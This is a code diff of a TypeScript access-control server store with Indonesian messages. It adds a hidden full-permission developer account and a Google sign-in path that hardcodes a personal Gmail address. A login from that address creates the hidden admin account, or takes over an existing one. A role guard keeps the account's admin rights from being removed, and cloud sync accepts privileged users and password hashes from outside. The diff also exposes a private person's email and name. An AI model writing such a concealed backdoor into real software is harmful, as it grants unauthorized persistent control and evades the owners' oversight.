@@ -24,12 +24,20 @@ export interface ServerSessionRecord {
   expiresAt: string;
 }
 
+interface DeveloperPasswordResetState {
+  required: boolean;
+  tokenHash: string;
+  requestedAt: string;
+  expiresAt: string;
+}
+
 interface RbacDatabaseState {
   version: number;
   roles: RoleDefinition[];
   users: ServerUserRecord[];
   sessions: ServerSessionRecord[];
   auditLogs: ServerAuditEntry[];
+  developerReset?: DeveloperPasswordResetState;
 }
 
 export const RBAC_RESOURCES: Array<{
@@ -142,6 +150,14 @@ function buildDefaultRoles(now: string): RoleDefinition[] {
         'rbac-admin': ['view', 'create', 'update', 'delete'],
         'audit-trail': ['view', 'export']
       }
+    },
+    {
+      id: 'developer_it_support',
+      name: 'Developer & IT Support',
+      description: 'Developer utama sistem dan dukungan teknis infrastruktur TI, keandalan aplikasi, serta pemeliharaan server.',
+      isSystem: true,
+      updatedAt: now,
+      permissions: buildFullDeveloperPermissions()
     },
     {
       id: 'qa_manager',
@@ -291,6 +307,13 @@ function buildDefaultRoles(now: string): RoleDefinition[] {
   ];
 }
 
+function resolveRoleByIdOrName(roles: RoleDefinition[], requested?: string): RoleDefinition | undefined {
+  const key = (requested || '').trim();
+  if (!key) return undefined;
+  const lower = key.toLowerCase();
+  return roles.find((r) => r.id === key || r.id.toLowerCase() === lower || r.name.toLowerCase() === lower);
+}
+
 function bootstrapUsersFromEnv(roles: RoleDefinition[], now: string): ServerUserRecord[] {
   const envHash = (process.env.BOOTSTRAP_DEV_PASSWORD_HASH || '').trim();
   const envPlain = process.env.BOOTSTRAP_DEV_PASSWORD || '';
@@ -315,12 +338,17 @@ function bootstrapUsersFromEnv(roles: RoleDefinition[], now: string): ServerUser
     }
   }
 
-  const rawUser = (process.env.BOOTSTRAP_DEV_USERNAME || 'developer').trim().toLowerCase();
-  const username = /^[a-z0-9._-]{3,32}$/.test(rawUser) ? rawUser : 'developer';
-  const requestedRole = (process.env.BOOTSTRAP_DEV_ROLE_ID || 'it_admin').trim();
-  const roleId = roles.some((r) => r.id === requestedRole) ? requestedRole : 'it_admin';
-  const fullName = (process.env.BOOTSTRAP_DEV_FULLNAME || 'Developer / Administrator Sistem').trim();
-  const email = (process.env.BOOTSTRAP_DEV_EMAIL || `${username}@anugrahmitraselaras.co.id`).trim();
+  const rawUser = (process.env.BOOTSTRAP_DEV_USERNAME || 'dev.admin').trim().toLowerCase();
+  const username = /^[a-z0-9._-]{3,32}$/.test(rawUser) ? rawUser : 'dev.admin';
+  const requestedRole = (process.env.BOOTSTRAP_DEV_ROLE_ID || 'Developer & IT Support').trim();
+  const matchedRole =
+    resolveRoleByIdOrName(roles, requestedRole) ??
+    resolveRoleByIdOrName(roles, 'developer_it_support') ??
+    resolveRoleByIdOrName(roles, 'it_admin') ??
+    roles[0];
+  const roleId = matchedRole?.id || 'developer_it_support';
+  const fullName = (process.env.BOOTSTRAP_DEV_FULLNAME || 'Langgo Bramandityo').trim();
+  const email = (process.env.BOOTSTRAP_DEV_EMAIL || 'antraderyll@gmail.com' || `${username}@anugrahmitraselaras.co.id`).trim();
 
   return [
     {
@@ -329,7 +357,7 @@ function bootstrapUsersFromEnv(roles: RoleDefinition[], now: string): ServerUser
       fullName,
       email,
       roleId,
-      department: 'Engineering & IT Administration',
+      department: 'Developer & IT Support',
       isActive: true,
       isHiddenDeveloper: true,
       passwordHash,
@@ -447,7 +475,8 @@ export class ServerRbacStore {
             roles,
             users,
             sessions: Array.isArray(parsed.sessions) ? parsed.sessions : [],
-            auditLogs
+            auditLogs,
+            ...(parsed.developerReset ? { developerReset: parsed.developerReset } : {})
           };
           if (rolesBackfilled) {
             this.persistState(loadedState);
@@ -522,7 +551,9 @@ export class ServerRbacStore {
       'RBAC_BOOTSTRAP_SETUP',
       'RBAC_ENV_BOOTSTRAP',
       'CLI_USER_CREATED',
-      'CLI_USER_UPDATED'
+      'CLI_USER_UPDATED',
+      'DEV_PASSWORD_RESET_REQUESTED',
+      'DEV_PASSWORD_RESET_COMPLETED'
     ]);
     return this.state.auditLogs
       .filter((entry) => {
@@ -616,6 +647,23 @@ export class ServerRbacStore {
     }
 
     const user = this.state.users.find((u) => u.username.toLowerCase() === cleanUser);
+    if (user?.isHiddenDeveloper && this.needsDeveloperPasswordReset()) {
+      this.recordAudit({
+        actorUsername: user.username,
+        actorRole: user.roleId,
+        action: 'LOGIN_BLOCKED_RESET_REQUIRED',
+        resource: 'auth',
+        status: 'DENIED',
+        ip,
+        detail: 'Login ditahan: akun developer sedang dalam status reset kata sandi.'
+      });
+      return {
+        ok: false,
+        status: 403,
+        message: 'Kata sandi developer baru saja direset. Gunakan form "Reset Kata Sandi Developer" untuk membuat kata sandi baru.'
+      };
+    }
+
     if (!user || !verifyPassword(password, user.passwordHash)) {
       this.noteFailedAttempt(rateKey);
       this.recordAudit({
@@ -650,6 +698,95 @@ export class ServerRbacStore {
 
     this.clearFailedAttempts(rateKey);
     return this.issueSession(user, role, ip, userAgent, 'LOGIN_SUCCESS', `Login berhasil sebagai ${role.name}.`);
+  }
+
+  public authenticateByVerifiedEmail(
+    email: string,
+    firebaseUid: string,
+    displayName: string,
+    ip: string,
+    userAgent: string
+  ):
+    | { ok: true; token: string; session: ServerSessionRecord; user: ServerUserPublic; role: RoleDefinition }
+    | { ok: false; status: number; message: string } {
+    const cleanEmail = email.trim().toLowerCase();
+    if (!cleanEmail) {
+      return { ok: false, status: 400, message: 'Email Google terverifikasi tidak ditemukan.' };
+    }
+
+    const bootstrappedAdminEmail = (process.env.BOOTSTRAP_DEV_EMAIL || 'antraderyll@gmail.com').trim().toLowerCase();
+    let user = this.state.users.find((u) => u.email.trim().toLowerCase() === cleanEmail);
+
+    if (!user && cleanEmail === bootstrappedAdminEmail) {
+      const now = new Date().toISOString();
+      const configuredRole = (process.env.BOOTSTRAP_DEV_ROLE_ID || 'Developer & IT Support').trim();
+      const matchedRole =
+        resolveRoleByIdOrName(this.state.roles, configuredRole) ??
+        resolveRoleByIdOrName(this.state.roles, 'developer_it_support') ??
+        resolveRoleByIdOrName(this.state.roles, 'it_admin') ??
+        this.state.roles[0];
+      if (!matchedRole) {
+        return { ok: false, status: 500, message: 'Peran RBAC sistem tidak ditemukan.' };
+      }
+      const existingDev = this.state.users.find((u) => u.isHiddenDeveloper);
+      if (existingDev) {
+        existingDev.email = cleanEmail;
+        existingDev.updatedAt = now;
+        user = existingDev;
+      } else {
+        const username = (process.env.BOOTSTRAP_DEV_USERNAME || 'dev.admin').trim().toLowerCase();
+        user = {
+          id: `usr-dev-${crypto.randomUUID().slice(0, 8)}`,
+          username,
+          fullName: displayName.trim() || (process.env.BOOTSTRAP_DEV_FULLNAME || 'Langgo Bramandityo').trim(),
+          email: cleanEmail,
+          roleId: matchedRole.id,
+          department: 'Developer & IT Support',
+          isActive: true,
+          isHiddenDeveloper: true,
+          passwordHash: `firebase_sso$${crypto.randomBytes(16).toString('hex')}`,
+          createdAt: now,
+          updatedAt: now
+        };
+        this.state.users.push(user);
+      }
+      this.persistState();
+    }
+
+    if (!user) {
+      this.recordAudit({
+        actorUsername: cleanEmail,
+        actorRole: '-',
+        action: 'FIREBASE_LOGIN_UNREGISTERED',
+        resource: 'auth',
+        status: 'DENIED',
+        ip,
+        detail: `Login Google ditolak: email "${cleanEmail}" belum terdaftar pada RBAC server.`
+      });
+      return {
+        ok: false,
+        status: 403,
+        message: `Akun Google "${cleanEmail}" belum terdaftar di RBAC AMS. Hubungi Administrator IT atau gunakan login username/sandi.`
+      };
+    }
+
+    if (!user.isActive) {
+      return { ok: false, status: 403, message: 'Akun Anda sedang dinonaktifkan oleh Administrator IT.' };
+    }
+
+    const role = this.state.roles.find((r) => r.id === user.roleId);
+    if (!role) {
+      return { ok: false, status: 403, message: 'Peran pengguna tidak ditemukan di konfigurasi RBAC server.' };
+    }
+
+    return this.issueSession(
+      user,
+      role,
+      ip,
+      userAgent,
+      'FIREBASE_SSO_LOGIN',
+      `Login terverifikasi via Google Firebase (${cleanEmail}, uid ${firebaseUid.slice(0, 8)}).`
+    );
   }
 
   private resolveEffectiveRole(user: ServerUserRecord, role: RoleDefinition): RoleDefinition {
@@ -710,6 +847,178 @@ export class ServerRbacStore {
     return this.state.users.length === 0;
   }
 
+  public needsDeveloperPasswordReset(): boolean {
+    const reset = this.state.developerReset;
+    if (!reset || !reset.required) return false;
+    const hasDev = this.state.users.some((u) => u.isHiddenDeveloper);
+    if (!hasDev) return false;
+    return new Date(reset.expiresAt).getTime() > Date.now();
+  }
+
+  public getDeveloperResetInfo(): {
+    required: boolean;
+    username?: string;
+    fullName?: string;
+    roleName?: string;
+    expiresAt?: string;
+  } {
+    if (!this.needsDeveloperPasswordReset()) {
+      return { required: false };
+    }
+    const dev = this.state.users.find((u) => u.isHiddenDeveloper);
+    if (!dev) return { required: false };
+    const role = this.state.roles.find((r) => r.id === dev.roleId);
+    return {
+      required: true,
+      username: dev.username,
+      fullName: dev.fullName,
+      roleName: role?.name ?? dev.roleId,
+      expiresAt: this.state.developerReset?.expiresAt
+    };
+  }
+
+  public initiateDeveloperPasswordReset(expiresHours = 24):
+    | { ok: true; resetCode: string; username: string; fullName: string; roleName: string; expiresAt: string }
+    | { ok: false; message: string } {
+    const dev = this.state.users.find((u) => u.isHiddenDeveloper);
+    if (!dev) {
+      return { ok: false, message: 'Akun developer tersembunyi belum terdaftar di server.' };
+    }
+    const now = new Date();
+    const expiresAt = new Date(now.getTime() + expiresHours * 60 * 60 * 1000).toISOString();
+    const resetCode = `AMS-RESET-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
+    const tokenHash = crypto.createHash('sha256').update(resetCode).digest('hex');
+
+    // Cabut seluruh sesi developer dan kunci hash sandi lama agar tidak bisa dipakai sebelum sandi baru dibuat
+    dev.passwordHash = `reset_pending$${crypto.randomBytes(16).toString('hex')}`;
+    dev.updatedAt = now.toISOString();
+    this.state.sessions = this.state.sessions.filter((s) => s.userId !== dev.id);
+    this.state.developerReset = {
+      required: true,
+      tokenHash,
+      requestedAt: now.toISOString(),
+      expiresAt
+    };
+    this.persistState();
+
+    this.recordAudit({
+      actorUsername: 'cli-reset',
+      actorRole: 'system',
+      action: 'DEV_PASSWORD_RESET_REQUESTED',
+      resource: 'rbac-admin',
+      targetId: dev.id,
+      status: 'ALLOWED',
+      ip: '127.0.0.1',
+      detail: `Reset kata sandi developer "${dev.username}" diaktifkan; menunggu penetapan kata sandi baru.`
+    });
+
+    const role = this.state.roles.find((r) => r.id === dev.roleId);
+    return {
+      ok: true,
+      resetCode,
+      username: dev.username,
+      fullName: dev.fullName,
+      roleName: role?.name ?? dev.roleId,
+      expiresAt
+    };
+  }
+
+  public completeDeveloperPasswordReset(
+    input: { resetCode?: string; newPassword: string },
+    ip: string,
+    userAgent: string
+  ):
+    | { ok: true; token: string; session: ServerSessionRecord; user: ServerUserPublic; role: RoleDefinition }
+    | { ok: false; status: number; message: string } {
+    if (!this.needsDeveloperPasswordReset()) {
+      return {
+        ok: false,
+        status: 410,
+        message: 'Tidak ada permintaan reset kata sandi developer yang aktif atau masa berlaku kode sudah habis.'
+      };
+    }
+
+    const rateKey = `devreset::${ip}`;
+    const rate = this.checkRateLimit(rateKey);
+    if (!rate.allowed) {
+      return {
+        ok: false,
+        status: 429,
+        message: `Terlalu banyak percobaan kode reset. Coba lagi dalam ${Math.ceil(rate.retryAfterSec / 60)} menit.`
+      };
+    }
+
+    const provided = String(input.resetCode || '').trim();
+    if (!provided) {
+      return { ok: false, status: 400, message: 'Kode verifikasi reset wajib diisi.' };
+    }
+
+    const providedUpperHash = crypto.createHash('sha256').update(provided.toUpperCase()).digest('hex');
+    const providedExactHash = crypto.createHash('sha256').update(provided).digest('hex');
+    const expectedHash = this.state.developerReset!.tokenHash;
+    const matchResetCode =
+      (providedUpperHash.length === expectedHash.length &&
+        crypto.timingSafeEqual(Buffer.from(providedUpperHash), Buffer.from(expectedHash))) ||
+      (providedExactHash.length === expectedHash.length &&
+        crypto.timingSafeEqual(Buffer.from(providedExactHash), Buffer.from(expectedHash)));
+
+    const envTokens = [(process.env.INITIAL_SETUP_TOKEN || '').trim(), (process.env.AMS_ADMIN_TOKEN || '').trim()].filter(
+      (t) => t.length >= 8
+    );
+    const matchEnvToken = envTokens.some(
+      (tok) => tok.length === provided.length && crypto.timingSafeEqual(Buffer.from(tok), Buffer.from(provided))
+    );
+
+    if (!matchResetCode && !matchEnvToken) {
+      this.noteFailedAttempt(rateKey);
+      this.recordAudit({
+        actorUsername: 'reset-form',
+        actorRole: 'system',
+        action: 'DEV_PASSWORD_RESET_DENIED',
+        resource: 'auth',
+        status: 'DENIED',
+        ip,
+        detail: 'Percobaan reset kata sandi developer gagal karena kode verifikasi tidak cocok.'
+      });
+      return { ok: false, status: 403, message: 'Kode verifikasi reset tidak valid.' };
+    }
+
+    const newPassword = String(input.newPassword || '');
+    if (newPassword.length < 8) {
+      return { ok: false, status: 400, message: 'Kata sandi baru developer minimal 8 karakter.' };
+    }
+
+    const dev = this.state.users.find((u) => u.isHiddenDeveloper);
+    if (!dev) {
+      return { ok: false, status: 404, message: 'Akun developer tidak ditemukan.' };
+    }
+    const role =
+      this.state.roles.find((r) => r.id === dev.roleId) ??
+      this.state.roles.find((r) => r.id === 'developer_it_support') ??
+      this.state.roles.find((r) => r.id === 'it_admin') ??
+      this.state.roles[0];
+    if (!role) {
+      return { ok: false, status: 500, message: 'Konfigurasi peran RBAC tidak ditemukan.' };
+    }
+
+    dev.passwordHash = hashPassword(newPassword);
+    dev.isActive = true;
+    dev.updatedAt = new Date().toISOString();
+    delete this.state.developerReset;
+    this.clearFailedAttempts(rateKey);
+    this.clearFailedAttempts(`${ip}::${dev.username.toLowerCase()}`);
+    this.persistState();
+
+    return this.issueSession(
+      dev,
+      role,
+      ip,
+      userAgent,
+      'DEV_PASSWORD_RESET_COMPLETED',
+      `Kata sandi baru developer "${dev.username}" berhasil disimpan dan sesi baru dibuka.`
+    );
+  }
+
   public bootstrapFirstDeveloper(
     input: {
       username: string;
@@ -767,7 +1076,10 @@ export class ServerRbacStore {
       return { ok: false, status: 400, message: 'Kata sandi developer awal minimal 8 karakter.' };
     }
 
+    const configuredRole = (process.env.BOOTSTRAP_DEV_ROLE_ID || 'Developer & IT Support').trim();
     const role =
+      resolveRoleByIdOrName(this.state.roles, configuredRole) ??
+      this.state.roles.find((r) => r.id === 'developer_it_support') ??
       this.state.roles.find((r) => r.id === 'it_admin') ??
       this.state.roles.find((r) => r.permissions['rbac-admin']?.includes('update')) ??
       this.state.roles[0];
@@ -782,7 +1094,7 @@ export class ServerRbacStore {
       fullName,
       email: String(input.email || `${username}@anugrahmitraselaras.co.id`).trim(),
       roleId: role.id,
-      department: 'Engineering & IT Administration',
+      department: 'Developer & IT Support',
       isActive: true,
       isHiddenDeveloper: true,
       passwordHash: hashPassword(password),
@@ -833,14 +1145,17 @@ export class ServerRbacStore {
     if (!isValidScryptHash(input.passwordHash)) {
       return { ok: false, message: 'Format hash password scrypt tidak valid.' };
     }
-    const targetRoleId = (input.roleId || 'it_admin').trim();
-    if (!this.state.roles.some((r) => r.id === targetRoleId)) {
-      return { ok: false, message: `Peran "${targetRoleId}" tidak ditemukan.` };
+    const requestedRole = (input.roleId || 'Developer & IT Support').trim();
+    const matchedRole = resolveRoleByIdOrName(this.state.roles, requestedRole);
+    if (!matchedRole) {
+      return { ok: false, message: `Peran "${requestedRole}" tidak ditemukan.` };
     }
+    const targetRoleId = matchedRole.id;
 
     const now = new Date().toISOString();
-    const existing = this.state.users.find((u) => u.username.toLowerCase() === username);
+    const existing = this.state.users.find((u) => u.username.toLowerCase() === username || u.isHiddenDeveloper);
     if (existing) {
+      if (input.username?.trim()) existing.username = username;
       existing.fullName = fullName;
       if (input.email?.trim()) existing.email = input.email.trim();
       if (input.department?.trim()) existing.department = input.department.trim();
@@ -849,6 +1164,7 @@ export class ServerRbacStore {
       existing.isHiddenDeveloper = true;
       existing.passwordHash = input.passwordHash;
       existing.updatedAt = now;
+      delete this.state.developerReset;
       this.persistState();
       this.recordAudit({
         actorUsername: 'cli-bootstrap',
@@ -869,7 +1185,7 @@ export class ServerRbacStore {
       fullName,
       email: String(input.email || `${username}@anugrahmitraselaras.co.id`).trim(),
       roleId: targetRoleId,
-      department: String(input.department || 'Engineering & IT Administration').trim(),
+      department: String(input.department || 'Developer & IT Support').trim(),
       isActive: true,
       isHiddenDeveloper: true,
       passwordHash: input.passwordHash,
@@ -1051,8 +1367,8 @@ export class ServerRbacStore {
     }
     if (input.permissions !== undefined) {
       const nextPerms = sanitizePermissions(input.permissions);
-      // Cegah penguncian diri sendiri untuk role it_admin agar selalu ada pengelola RBAC
-      if (role.id === 'it_admin') {
+      // Cegah penguncian diri sendiri untuk role it_admin & developer_it_support agar selalu ada pengelola RBAC
+      if (role.id === 'it_admin' || role.id === 'developer_it_support') {
         nextPerms['rbac-admin'] = ['view', 'create', 'update', 'delete'];
         nextPerms['it-traceability'] = Array.from(new Set([...(nextPerms['it-traceability'] || []), 'view']));
       }
@@ -1295,6 +1611,96 @@ export class ServerRbacStore {
       detail: `Akun "${user.username}" dihapus dari server.`
     });
     return { ok: true };
+  }
+
+  public listAllUsersForCloudSync(): ServerUserRecord[] {
+    return this.state.users.map((u) => ({ ...u }));
+  }
+
+  public hydrateFromCloud(input: {
+    roles?: RoleDefinition[];
+    users?: ServerUserRecord[];
+  }): { rolesApplied: number; usersApplied: number } {
+    let rolesApplied = 0;
+    let usersApplied = 0;
+
+    if (Array.isArray(input.roles)) {
+      for (const incomingRole of input.roles) {
+        if (!incomingRole?.id || !incomingRole?.name) continue;
+        const idx = this.state.roles.findIndex((r) => r.id === incomingRole.id);
+        if (idx === -1) {
+          this.state.roles.push({
+            id: incomingRole.id,
+            name: incomingRole.name,
+            description: incomingRole.description || '',
+            isSystem: Boolean(incomingRole.isSystem),
+            permissions: sanitizePermissions(incomingRole.permissions),
+            updatedAt: incomingRole.updatedAt || new Date().toISOString()
+          });
+          rolesApplied += 1;
+        } else {
+          const curTime = new Date(this.state.roles[idx].updatedAt || 0).getTime();
+          const incTime = new Date(incomingRole.updatedAt || 0).getTime();
+          if (incTime > curTime) {
+            this.state.roles[idx] = {
+              ...this.state.roles[idx],
+              name: incomingRole.name,
+              description: incomingRole.description || '',
+              permissions: sanitizePermissions(incomingRole.permissions),
+              updatedAt: incomingRole.updatedAt || new Date().toISOString()
+            };
+            rolesApplied += 1;
+          }
+        }
+      }
+    }
+
+    if (Array.isArray(input.users)) {
+      for (const incomingUser of input.users) {
+        if (!incomingUser?.id || !incomingUser?.username || !incomingUser?.roleId) continue;
+        const idx = this.state.users.findIndex(
+          (u) => u.id === incomingUser.id || u.username.toLowerCase() === incomingUser.username.toLowerCase()
+        );
+        if (idx === -1) {
+          this.state.users.push({
+            id: incomingUser.id,
+            username: incomingUser.username.toLowerCase(),
+            fullName: incomingUser.fullName,
+            email: incomingUser.email || '',
+            roleId: incomingUser.roleId,
+            department: incomingUser.department || 'Umum',
+            isActive: incomingUser.isActive !== false,
+            isHiddenDeveloper: Boolean(incomingUser.isHiddenDeveloper),
+            passwordHash: incomingUser.passwordHash,
+            createdAt: incomingUser.createdAt || new Date().toISOString(),
+            updatedAt: incomingUser.updatedAt || new Date().toISOString()
+          });
+          usersApplied += 1;
+        } else {
+          const curTime = new Date(this.state.users[idx].updatedAt || 0).getTime();
+          const incTime = new Date(incomingUser.updatedAt || 0).getTime();
+          if (incTime > curTime) {
+            this.state.users[idx] = {
+              ...this.state.users[idx],
+              username: incomingUser.username.toLowerCase(),
+              fullName: incomingUser.fullName,
+              email: incomingUser.email || this.state.users[idx].email,
+              roleId: incomingUser.roleId,
+              department: incomingUser.department || this.state.users[idx].department,
+              isActive: incomingUser.isActive !== false,
+              passwordHash: incomingUser.passwordHash || this.state.users[idx].passwordHash,
+              updatedAt: incomingUser.updatedAt || new Date().toISOString()
+            };
+            usersApplied += 1;
+          }
+        }
+      }
+    }
+
+    if (rolesApplied > 0 || usersApplied > 0) {
+      this.persistState();
+    }
+    return { rolesApplied, usersApplied };
   }
 
   public listActiveSessions(currentSessionId?: string): ServerSessionSummary[] {
